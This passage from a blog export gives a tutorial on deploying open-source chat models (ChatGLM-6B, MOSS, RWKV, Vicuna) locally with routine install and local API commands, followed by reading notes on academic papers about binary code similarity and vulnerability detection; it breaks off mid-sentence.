<h2 id="ChatGLM-6B"><a href="#ChatGLM-6B" class="headerlink" title="ChatGLM-6B"></a>ChatGLM-6B</h2><p><a class="link"   href="https://github.com/THUDM/ChatGLM-6B" >ChatGLM-6B<i class="fas fa-external-link-alt"></i></a> is an open bilingual language model based on <a class="link"   href="https://github.com/THUDM/GLM" >General Language Model (GLM)<i class="fas fa-external-link-alt"></i></a> from <code>THUDM</code>. </p>
<p>The <code>ChatGLM-130B</code> based on <a class="link"   href="https://github.com/THUDM/GLM-130B" >GLM-130B<i class="fas fa-external-link-alt"></i></a> has been tested and used by mant commercial companies, and gets fairly good results as <code>GPT-3 175B (davinci)</code>. </p>
<p>Another cool thing is <a class="link"   href="https://github.com/THUDM/CodeGeeX" >CodeGeeX<i class="fas fa-external-link-alt"></i></a> which is a large-scale multilingual code generation model with 13 billion parameters, pre-trained on a large code corpus of more than 20 programming languages. However it is kind of occupying memory, so the vscode&#x2F;jetbrain plugins are recommended.</p>
<p>Here we try to deploy <a class="link"   href="https://github.com/THUDM/ChatGLM-6B" >ChatGLM-6B<i class="fas fa-external-link-alt"></i></a> locally.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/THUDM/ChatGLM-6B</span><br><span class="line">$ <span class="built_in">cd</span> ChatGLM-6B</span><br><span class="line">$ conda create -n chatglm python=3.10</span><br><span class="line">$ conda activate chatglm</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>Model weights can be seen on <a class="link"   href="https://huggingface.co/THUDM" >HugginFace&#x2F;THUDM<i class="fas fa-external-link-alt"></i></a>, and we can directly run a demo </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># official `gradio` way</span></span><br><span class="line">$ python web_demo.py</span><br><span class="line"><span class="comment"># or try `streamlit`</span></span><br><span class="line">$ pip install streamlit</span><br><span class="line">$ pip install streamlit-chat</span><br><span class="line">$ streamlit run web_demo2.py --server.port 6006</span><br><span class="line"><span class="comment"># or console interaction</span></span><br><span class="line">$ python cli_demo.py</span><br></pre></td></tr></table></figure>
<p>API deployment</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install dependencies</span></span><br><span class="line">$ pip install fastapi uvicorn</span><br><span class="line"><span class="comment"># then run</span></span><br><span class="line">$ python api.py</span><br><span class="line"><span class="comment"># access, through cli or codes</span></span><br><span class="line">$ curl -X POST <span class="string">&quot;http://127.0.0.1:8000&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;prompt&quot;: &quot;你好&quot;, &quot;history&quot;: []&#125;&#x27;</span></span><br><span class="line"><span class="comment"># resonse</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;response&quot;</span>:<span class="string">&quot;你好👋！我是人工智能助手 ChatGLM-6B，很高兴见到你，欢迎问我任何问题。&quot;</span>,</span><br><span class="line">  <span class="string">&quot;history&quot;</span>:[[<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;你好👋！我是人工智能助手 ChatGLM-6B，很高兴见到你，欢迎问我任何问题。&quot;</span>]],</span><br><span class="line">  <span class="string">&quot;status&quot;</span>:200,</span><br><span class="line">  <span class="string">&quot;time&quot;</span>:<span class="string">&quot;2023-03-23 21:38:40&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Or generate dialogue in python</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModel</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;THUDM/chatglm-6b&quot;</span>, trust_remote_code=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>model = AutoModel.from_pretrained(<span class="string">&quot;THUDM/chatglm-6b&quot;</span>, trust_remote_code=<span class="literal">True</span>).half().cuda()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>model = model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>response, history = model.chat(tokenizer, <span class="string">&quot;你好&quot;</span>, history=[])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(response)</span><br><span class="line">你好👋!我是人工智能助手 ChatGLM-6B,很高兴见到你,欢迎问我任何问题。</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>response, history = model.chat(tokenizer, <span class="string">&quot;晚上睡不着应该怎么办&quot;</span>, history=history)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(response)</span><br><span class="line">晚上睡不着可能会让你感到焦虑或不舒服,但以下是一些可以帮助你入睡的方法:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 制定规律的睡眠时间表:保持规律的睡眠时间表可以帮助你建立健康的睡眠习惯,使你更容易入睡。尽量在每天的相同时间上床,并在同一时间起床。</span><br><span class="line"><span class="number">2.</span> 创造一个舒适的睡眠环境:确保睡眠环境舒适,安静,黑暗且温度适宜。可以使用舒适的床上用品,并保持房间通风。</span><br><span class="line"><span class="number">3.</span> 放松身心:在睡前做些放松的活动,例如泡个热水澡,听些轻柔的音乐,阅读一些有趣的书籍等,有助于缓解紧张和焦虑,使你更容易入睡。</span><br><span class="line"><span class="number">4.</span> 避免饮用含有咖啡因的饮料:咖啡因是一种刺激性物质,会影响你的睡眠质量。尽量避免在睡前饮用含有咖啡因的饮料,例如咖啡,茶和可乐。</span><br><span class="line"><span class="number">5.</span> 避免在床上做与睡眠无关的事情:在床上做些与睡眠无关的事情,例如看电影,玩游戏或工作等,可能会干扰你的睡眠。</span><br><span class="line"><span class="number">6.</span> 尝试呼吸技巧:深呼吸是一种放松技巧,可以帮助你缓解紧张和焦虑,使你更容易入睡。试着慢慢吸气,保持几秒钟,然后缓慢呼气。</span><br><span class="line"></span><br><span class="line">如果这些方法无法帮助你入睡,你可以考虑咨询医生或睡眠专家,寻求进一步的建议。</span><br></pre></td></tr></table></figure>

<h2 id="MOSS"><a href="#MOSS" class="headerlink" title="MOSS"></a>MOSS</h2><p><a class="link"   href="https://github.com/OpenLMLab/MOSS" >MOSS<i class="fas fa-external-link-alt"></i></a> is an open-sourced plugin-augmented conversational language model, another LLM from China.<br>It is also a lightweighted model which </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/OpenLMLab/MOSS.git</span><br><span class="line">$ <span class="built_in">cd</span> MOSS</span><br><span class="line">$ conda create --name moss python=3.8</span><br><span class="line">$ conda activate moss</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>Start a web demo</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># streamlit</span></span><br><span class="line">$ streamlit run moss_web_demo_streamlit.py --server.port 8888</span><br><span class="line"><span class="comment"># gradio</span></span><br><span class="line">$ python moss_web_demo_gradio.py</span><br><span class="line"><span class="comment"># cli</span></span><br><span class="line">$ python moss_cli_demo.py</span><br></pre></td></tr></table></figure>
<p>API demo</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python moss_api_demo.py</span><br><span class="line"><span class="comment">## curl moss</span></span><br><span class="line">$ curl -X POST <span class="string">&quot;http://localhost:19324&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;prompt&quot;: &quot;你是谁？&quot;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># response</span></span><br><span class="line">&#123;<span class="string">&quot;response&quot;</span>:<span class="string">&quot;\n&lt;|Worm|&gt;: 你好，有什么我可以帮助你的吗？&quot;</span>,<span class="string">&quot;history&quot;</span>:[[<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;\n&lt;|Worm|&gt;: 你好，有什么我可以帮助你的吗？&quot;</span>]],<span class="string">&quot;status&quot;</span>:200,<span class="string">&quot;time&quot;</span>:<span class="string">&quot;2023-04-28 09:43:41&quot;</span>,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;10973cfc-85d4-4b7b-a56a-238f98689d47&quot;</span>&#125;</span><br><span class="line"><span class="comment">## curl moss multi-round, by filling `uid`</span></span><br><span class="line">$ curl -X POST <span class="string">&quot;http://localhost:19324&quot;</span> \</span><br><span class="line">     -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;&quot;prompt&quot;: &quot;你是谁？&quot;, &quot;uid&quot;:&quot;10973cfc-85d4-4b7b-a56a-238f98689d47&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Read <a class="link"   href="https://github.com/OpenLMLab/MOSS" >README<i class="fas fa-external-link-alt"></i></a> to see how to generate contents in python, and more precise operating parameters.</p>
<h2 id="RWKV"><a href="#RWKV" class="headerlink" title="RWKV"></a>RWKV</h2><p><a class="link"   href="https://github.com/BlinkDL/ChatRWKV" >ChatRWKV<i class="fas fa-external-link-alt"></i></a> is like <code>ChatGPT</code> but powered by my <a class="link"   href="https://github.com/BlinkDL/RWKV-LM" >RWKV<i class="fas fa-external-link-alt"></i></a> (100% <code>RNN</code>) language model, which is the only <code>RNN</code> (as of now) that can match transformers in quality and scaling, while being faster and saves VRAM.</p>
<p>There is not so much content in <a class="link"   href="https://github.com/BlinkDL/ChatRWKV/blob/main/README.md" >README.md<i class="fas fa-external-link-alt"></i></a>, while it’s easy to interact with the model.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install dependencies</span></span><br><span class="line">$ conda create --name rwkv python=3.10</span><br><span class="line">$ conda activate rwkv</span><br><span class="line">$ conda install numpy</span><br><span class="line">$ conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch -c nvidia</span><br><span class="line">$ pip install prompt_toolkit</span><br><span class="line"></span><br><span class="line"><span class="comment"># run v2/chat.py</span></span><br><span class="line">$ python v2/chat.py</span><br></pre></td></tr></table></figure>
<p>Models can be found at <a class="link"   href="https://huggingface.co/BlinkDL" >HuggingFace&#x2F;BlinkDL<i class="fas fa-external-link-alt"></i></a>, different name (raven, pile, novel, …) indicates different training corpus. Download models and modify model paths in <code>v2/chat.py</code> to use.</p>
<p>The <a class="link"   href="https://github.com/wenda-LLM/wenda" >https://github.com/l15y/wenda<i class="fas fa-external-link-alt"></i></a> is recommended to host Web pages for interaction (also supports llama, chatglm, moss …).</p>
<h2 id="Vicuna"><a href="#Vicuna" class="headerlink" title="Vicuna"></a>Vicuna</h2><p><a href="https://lmsys.org/blog/2023-03-30-vicuna/"><code>Vicuna-13B</code></a>, an open-source chatbot trained by fine-tuning LLaMA on user-shared conversations collected from ShareGPT. Preliminary evaluation (<a class="link"   href="https://chat.lmsys.org/?arena" >Chatbot Arena<i class="fas fa-external-link-alt"></i></a>) using <code>GPT-4</code> as a judge shows <code>Vicuna-13B</code> achieves more than <code>90%*</code> quality of OpenAI <code>ChatGPT</code> and Google <code>Bard</code> while outperforming other models like <code>LLaMA</code> and Stanford <code>Alpaca</code> in more than <code>90%*</code> of cases.</p>
<p>So it seems that, as of posting time the <code>Vicuna-13B</code> is the open-source LLM with best performance. We can deploy it using <a class="link"   href="https://github.com/lm-sys/FastChat" >FastChat<i class="fas fa-external-link-alt"></i></a>.</p>
<p>First of all install <code>FastChat</code> by <code>pip</code> or from <a class="link"   href="https://github.com/lm-sys/FastChat" >source<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip, which is much easier</span></span><br><span class="line">$ pip3 install fschat</span><br><span class="line"></span><br><span class="line"><span class="comment"># from source</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/lm-sys/FastChat.git</span><br><span class="line">$ <span class="built_in">cd</span> FastChat</span><br><span class="line">$ pip3 install --upgrade pip  <span class="comment"># enable PEP 660 support</span></span><br><span class="line">$ pip3 install -e .</span><br></pre></td></tr></table></figure>
<p><code>Vicuna</code> weights are released as delta weights to comply with the <code>LLaMA</code> model license. We can add our delta to the original <code>LLaMA</code> weights to obtain the <code>Vicuna</code> weights.</p>
<p>Remember to download <code>LLaMA</code> weights first, we can download using <code>snapshot_download</code> from <code>huggingface_hub</code>. </p>
<p>Then convert </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.model.apply_delta \</span><br><span class="line">    --base-model-path /path/to/llama-7b \</span><br><span class="line">    --target-model-path /path/to/output/vicuna-7b \</span><br><span class="line">    --delta-path lmsys/vicuna-7b-delta-v1.1</span><br></pre></td></tr></table></figure>
<p><code>FastChat</code> can run chatting like this:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.serve.cli --model-path lmsys/fastchat-t5-3b-v1.0</span><br></pre></td></tr></table></figure>
<p>So we can start <code>Vicuna</code> like this. </p>
<p>To serve using the web UI, we need <code>three</code> main components: <code>web servers</code> that interface with users, <code>model workers</code> that host one or more models, and a <code>controller</code> to coordinate the <code>web server</code> and <code>model workers</code>.<br><img src="https://raw.githubusercontent.com/lm-sys/FastChat/main/assets/server_arch.png" alt="arch"></p>
<p>Launch the controller</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.serve.controller</span><br></pre></td></tr></table></figure>
<p>Launch the model worker(s)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.serve.model_worker --model-path /path/to/model/weights</span><br></pre></td></tr></table></figure>
<p>To ensure that your model worker is connected to your controller properly, send a test message using the following command:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.serve.test_message --model-name vicuna-7b</span><br></pre></td></tr></table></figure>
<p>You will see a short output.</p>
<p>Launch the Gradio web server</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python3 -m fastchat.serve.gradio_web_server</span><br></pre></td></tr></table></figure>
<p>This is the user interface that users will interact with.</p>
<p>API access usage visit <a class="link"   href="https://github.com/lm-sys/FastChat/blob/main/docs/openai_api.md" >OpenAI-Compatible RESTful APIs &amp; SDK<i class="fas fa-external-link-alt"></i></a>, by which we can use openai api to interact</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>This blog only includes some of featured models, like the first popular open-source LLM <code>LLaMA</code> and its variants (<code>Alpaca</code>, <code>Vicuna</code>), the low-cost training&#x2F;finetuning method <code>Alpaca-LoRA</code>, and models from China: <code>ChatGLM</code>, <code>MOSS</code> and <code>RWKV</code>.</p>
<hr>
<p>Aside from these Large Lange Models, there are also some other kinds of interesting models that we can give a try.</p>
<h2 id="LLaVA"><a href="#LLaVA" class="headerlink" title="LLaVA"></a>LLaVA</h2><p><a class="link"   href="https://github.com/haotian-liu/LLaVA" >https://github.com/haotian-liu/LLaVA<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="MiniGPT-4"><a href="#MiniGPT-4" class="headerlink" title="MiniGPT-4"></a>MiniGPT-4</h2><p><a class="link"   href="https://github.com/Vision-CAIR/MiniGPT-4" >https://github.com/Vision-CAIR/MiniGPT-4<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="Stable-Diffusion"><a href="#Stable-Diffusion" class="headerlink" title="Stable Diffusion"></a>Stable Diffusion</h2><p><a class="link"   href="https://github.com/Stability-AI/stablediffusion" >https://github.com/Stability-AI/stablediffusion<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>note</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary Code Similarity Detection Papers (Part2)</title>
    <url>/2023/02/07/2023-02-07-Binary-Code-Similarity-Detection-Papers-Part2/</url>
    <content><![CDATA[<p>Additional list in alphabetical order, including what I’ve read.</p>
<h2 id="A-Large-Scale-Empirical-Analysis-of-the-Vulnerabilities-Introduced-by-Third-Party-Components-in-IoT-Firmware"><a href="#A-Large-Scale-Empirical-Analysis-of-the-Vulnerabilities-Introduced-by-Third-Party-Components-in-IoT-Firmware" class="headerlink" title="A Large-Scale Empirical Analysis of the Vulnerabilities Introduced by Third-Party Components in IoT Firmware"></a>A Large-Scale Empirical Analysis of the Vulnerabilities Introduced by Third-Party Components in IoT Firmware</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.bbge.org/publication/zhao-2022-issta/zhao-2022-issta.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.bbge.org/publication/zhao-2022-issta/slides.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://www.bbge.org/publication/zhao-2022-issta/" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>ISSTA 2022</th>
</tr>
</thead>
</table>
<p>Challenges:</p>
<ol>
<li>Firmware Dataset Construction</li>
<li>Firmware Processing<ul>
<li>limitations on dealing with latest&#x2F;customized fs</li>
<li>monolithic firmware</li>
</ul>
</li>
<li>TPC Detection and Vulnerability Identification</li>
</ol>
<p>Contributions:</p>
<ol>
<li>largest firmware dataset</li>
<li>proposed FirmSec</li>
<li>conduct first large-scale analysis of the vulnerable TPC problem in firmware. We identify 584 TPCs and detect 429 CVEs in 34, 136 firmware images</li>
</ol>
<p>FirmSec mainly contains three components: </p>
<ol>
<li>firmware collection,<br> implement a web crawler to collect firmware from three sources: <ol>
<li>Official website; </li>
<li>FTP site; </li>
<li>Community. e.g., Xiaomi, from the community, including the related forums and GitHub repositories; </li>
<li>Private firmware repository.</li>
</ol>
</li>
<li>firmware preprocessing and<br> will process the collected firmware in three steps: <ol>
<li>filter out the non-firmware files from the raw dataset;<br> Binary Analysis Next Generation (BANG)</li>
<li>identify the necessary information of firmware;<br> metadata and binwalk</li>
<li>unpack and disassemble firmware</li>
</ol>
</li>
<li>firmware analysis.<ul>
<li>TPC Database Construction</li>
<li>TPC Detection<br>  use customized Gemini, aggregate similarity of ACFGs to compare TPC<br>  use cyclomatic complexity (CC) to evaluate the complexity of a CFG</li>
<li>Vulnerability Identification<br>  version chekcs -&gt; potential vul</li>
</ul>
</li>
</ol>
<p>Evaluation: Gemini, BAT, OSSPolice</p>
<ul>
<li>firmware vulnerability</li>
<li>geographical distribution</li>
<li>delay time of TPCs (when to adopt latest TPCs)</li>
<li>license violations</li>
</ul>
<p><img src="/./imghost/bcsdpp/firmsec.jpg" alt="Architecture of FirmSec"></p>
<h2 id="An-Investigation-of-the-Android-Kernel-Patch-Ecosystem"><a href="#An-Investigation-of-the-Android-Kernel-Patch-Ecosystem" class="headerlink" title="An Investigation of the Android Kernel Patch Ecosystem"></a>An Investigation of the Android Kernel Patch Ecosystem</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.usenix.org/system/files/sec21-zhang-zheng.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.usenix.org/system/files/sec21_slides_zhang-zheng.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th>repo</th>
<th>Usenix Security 2021</th>
</tr>
</thead>
<tbody><tr>
<td>investigate the unique Android kernel ecosystem that is decentralized and fragmented.</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="/./imghost/bcsdpp/androideco.jpg" alt="Android ecosystem for kernel version 4.4"></p>
<p>improve a state-of-the-art source-to-binary patch presence test tool.</p>
<p>conduct a large-scale measurement.</p>
<ul>
<li>three different types of kernels:<ul>
<li>type 1: repositories (git)</li>
<li>type 2: source code snapshots (without commit history)</li>
<li>type 3: binary (most available, firmware images or ROMs)</li>
</ul>
</li>
<li>measurement pipeline<ul>
<li>crawler -&gt; CVE &amp; patch commit</li>
<li>patch locator -&gt; for type 1<br>  determine if a given <code>patch</code> exists in a target kernel <code>repository</code>, by:<ol>
<li>current commit subject&#x2F;commit message</li>
<li>commit history</li>
<li>match the added and deleted lines only</li>
<li>manual search as a last resort (6.8%)<br>  File path&#x2F;name change, Function name change, Patched at initialization time</li>
</ol>
</li>
<li>patch evolution tracker -&gt; for type 2<br>  collect all possible <code>versions</code> of a patched <code>function</code>, Qualcomm repos and  mainline branch</li>
<li>source-level matcher -&gt; for type 2<br>  tries to match each patched function version, by strict string matching (no false pos, and false negs small&#x2F;low)</li>
<li>E-FIBER -&gt; for type 3<br>  on top of FIBER, translating each patched function version into a binary signature, and then matching the signature, deal with inline problem.<br>pipeline see figure 2.</li>
</ul>
</li>
</ul>
<p><img src="/./imghost/bcsdpp/androidpipe.jpg" alt="Measurement pipeline"></p>
<p>explain the causes of patch delays, also distill takeaways and potential prescriptive solutions to improve the current situation.<br>knowledge of a security vulnerability is lacking, kernel branch drifted.</p>
<h2 id="Binary-Code-Similarity-Detection"><a href="#Binary-Code-Similarity-Detection" class="headerlink" title="Binary Code Similarity Detection"></a>Binary Code Similarity Detection</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://dl.acm.org/doi/abs/10.1109/ASE51524.2021.9678518" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ASE 2021</th>
</tr>
</thead>
</table>
<p>if we symbolically execute similar binary codes, symbolic values at these key instructions are expected to be similar.</p>
<ol>
<li>First, it symbolically executes binary code;<br> execute many times, and select different paths to cover all paths</li>
<li>Second, it extracts symbolic values at defined key instructions (IR) into a graph;<br> (Key) instructions as nodes (reserve all symbolic values), connect based on control flow</li>
<li>Last, it compares the symbolic graph similarity.<br> check node similarity, and context (neighbor nodes) similarity</li>
<li>also address some problems, including path explosion and loop handling.</li>
</ol>
<p><img src="/./imghost/bcsdpp/bcsdkeyir.jpg" alt="Key IR graph comparison"></p>
<h2 id="Binary-Diffing-as-a-Network-Alignment-Problem-via-Belief-Propagation"><a href="#Binary-Diffing-as-a-Network-Alignment-Problem-via-Belief-Propagation" class="headerlink" title="Binary Diffing as a Network Alignment Problem via Belief Propagation"></a>Binary Diffing as a Network Alignment Problem via Belief Propagation</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://basepub.dauphine.psl.eu/bitstream/handle/123456789/22755/menginrossi2021binary-diffing.pdf?sequence=2" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ASE 2021</th>
</tr>
</thead>
</table>
<p>leverage a graph edit formulation of binary diffing: find the optimal transformation of two graphs.<br>it is equivalent to a network alignment problem.<br>propose an efficient approximate solver of this problem based on max-product belief propagation.</p>
<p>compared with Gemini, GraphMatching(Network) and DeepBinDiff<br><img src="/./imghost/bcsdpp/binarydiffing.jpg" alt="Binary diffing as an alignment of call graphs"></p>
<h2 id="COMBO-Pre-Training-Representations-of-Binary-Code-Using-Contrastive-Learning-–-Arxiv-2022"><a href="#COMBO-Pre-Training-Representations-of-Binary-Code-Using-Contrastive-Learning-–-Arxiv-2022" class="headerlink" title="COMBO: Pre-Training Representations of Binary Code Using Contrastive Learning – Arxiv 2022"></a>COMBO: Pre-Training Representations of Binary Code Using Contrastive Learning – Arxiv 2022</h2><p>propose a COntrastive learning Model for Binary cOde Analysis, or COMBO, that incorporates source code and comment information into binary code during representation learning.</p>
<p>Specifically, we present three components in COMBO: </p>
<ol>
<li>a primary <code>contrastive learning</code> method for cold-start pre-training, </li>
<li>a simplex interpolation method to incorporate <code>source</code> code, <code>comments</code>, and <code>binary</code> code, and </li>
<li>an intermediate representation learning algorithm to provide binary code <code>embeddings</code>.</li>
</ol>
<p>what is weird, is that it compared with codebert and graphcodebert (they are source code releated lang model)</p>
<p><img src="/./imghost/bcsdpp/combo.jpg" alt="Diagram of simplex interpolation and intermediate representation learning in COMBO"></p>
<h2 id="jTrans-Jump-Aware-Transformer-for-Binary-Code-Similarity-Detection"><a href="#jTrans-Jump-Aware-Transformer-for-Binary-Code-Similarity-Detection" class="headerlink" title="jTrans: Jump-Aware Transformer for Binary Code Similarity Detection"></a>jTrans: Jump-Aware Transformer for Binary Code Similarity Detection</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/2205.12713.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th><a class="link"   href="https://www.youtube.com/watch?v=rAirmnUsC1k" >video<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://github.com/vul337/jTrans/" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>ISSTA 2022</th>
</tr>
</thead>
</table>
<p>the first solution that embeds control flow information of binary code into Transformer-based language models, by using a novel jump-aware representation of the analyzed binaries and a newly-designed pre-training task</p>
<p><img src="/./imghost/bcsdpp/jtrans.jpg" alt="Input representation of jTrans"></p>
<h2 id="Practical-Binary-Code-Similarity-Detection-with-BERT-based-Transferable-Similarity-Learning"><a href="#Practical-Binary-Code-Similarity-Detection-with-BERT-based-Transferable-Similarity-Learning" class="headerlink" title="Practical Binary Code Similarity Detection with BERT-based Transferable Similarity Learning"></a>Practical Binary Code Similarity Detection with BERT-based Transferable Similarity Learning</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://dl.acm.org/doi/abs/10.1145/3564625.3567975" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.acsac.org/2022/program/papers/76-Ahn-Software_Security_I.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://github.com/asw0316/binshot" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>ACSAC 2022</th>
</tr>
</thead>
</table>
<p>propose <code>BinShot</code>, a BERT-based similarity learning architecture that is highly transferable for effective BCSD</p>
<p>our finding reveals that both a distance function and a loss function within an architecture highly affect the performance of a model</p>
<p>use <code>one-shot learning</code>, adopt a <code>weighted distance vector</code> with a <code>binary cross entropy</code> as a loss function on top of <code>BERT</code>.</p>
<ol>
<li>Pre-processer<ul>
<li>disassembly</li>
<li>inst normalization</li>
</ul>
</li>
<li>Pre-trainer<ul>
<li>MLM</li>
<li>Alternatives to an NSP task</li>
</ul>
</li>
<li>Fine-tuner<br> we leverage a Siamese neural network into a classifier, learning a weighted distance<br> defines a loss function as a binary cross entropy for binary classification</li>
<li>Predictor</li>
</ol>
<p><img src="/./imghost/bcsdpp/binshot.jpg" alt="The overall workflow of BinShot that consists of four components"></p>
<h2 id="Semantically-find-similar-binary-codes-with-mixed-key-instruction-sequence-–-IST-2020"><a href="#Semantically-find-similar-binary-codes-with-mixed-key-instruction-sequence-–-IST-2020" class="headerlink" title="Semantically find similar binary codes with mixed key instruction sequence – IST 2020"></a>Semantically find similar binary codes with mixed key instruction sequence – IST 2020</h2><p>This paper proposes a new binary code similarity comparison method based on the mixed key instruction sequence (<code>MKIS</code>), which contains both <code>API calls</code> and <code>key values</code> (insts that does not change in multiple runs).</p>
<p>MKIS calculates the <code>similarity</code> between p(plaintiff) and s(suspect) through <code>lcs(Longest common subsequence)</code>, uses the transfer matrix, based on MKIS (executed insts) sequences.</p>
<p><img src="/./imghost/bcsdpp/mkis.jpg" alt="Mixed key-instruction based similarity comparison flow chart"></p>
<h2 id="Tracer-Signature-based-Static-Analysis-for-Detecting-Recurring-Vulnerabilities"><a href="#Tracer-Signature-based-Static-Analysis-for-Detecting-Recurring-Vulnerabilities" class="headerlink" title="Tracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities"></a>Tracer: Signature-based Static Analysis for Detecting Recurring Vulnerabilities</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://prosys.kaist.ac.kr/publications/ccs22.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://prosys.kaist.ac.kr/tracer/" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://github.com/prosyslab/tracer" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>CCS 2022</th>
</tr>
</thead>
</table>
<p>we present a general analysis framework, called Tracer, for detecting such recurring vulnerabilities.<br>The main idea is to represent vulnerability signatures as traces over interprocedural data dependencies.</p>
<p>For a given set of known vulnerabilities, the <code>taint analysis</code> extracts <code>vulnerable traces</code> and establishes a <code>signature database</code> of them.<br>When a new unseen program is analyzed, Tracer <code>compares</code> all potentially vulnerable traces reported by the analysis with the known vulnerability signatures.<br>Then, Tracer reports a list of potential vulnerabilities ranked by the similarity score.</p>
<p>While the <code>essence</code> of the vulnerability is still the <code>same</code>, the <code>different</code> code <code>structure</code> of libXcursor fundamentally <code>hinders</code> the detectability of the tools.</p>
<p>Taint Analysis.<br>    Taint analysis computes <code>potential data flows</code> from untrusted inputs (<code>sources</code>) to sensitive functions (<code>sinks</code>) with a <code>simple abstract domain</code> for tainted values.<br>Traces on Data Dependency Graphs.<br>    Tracer extracts vulnerable traces from the source and sink points, and <code>filter</code> out irrelevent statements by deriving vuln traces on <code>DDG</code>(data dependency graph, or maybe <code>DFG</code>?) rather than CFG. same procedure will be applied to new target programs.<br>Feature Representation.<br>    Next, Tracer encodes each trace as an integer feature vector. feature vector consists of <code>low-level</code> and <code>high-level</code> features.<br>    <code>Low-level</code> features represent the <code>frequencies of primitive operators</code>(<code>NumOfOpX</code>) X (e.g., *, &lt;&lt;) and <code>common APIs</code>(<code>NumOfLibX</code>) X (e.g., strlen) on the trace.<br>    high-level features describe detailed behavior of traces, like <code>IfSmallerThanConst</code> checks whether a trace has a <code>conditional statement</code>. They manually designed <code>5</code> high-level features.<br>Similarity Checking.<br>    Since all the traces are 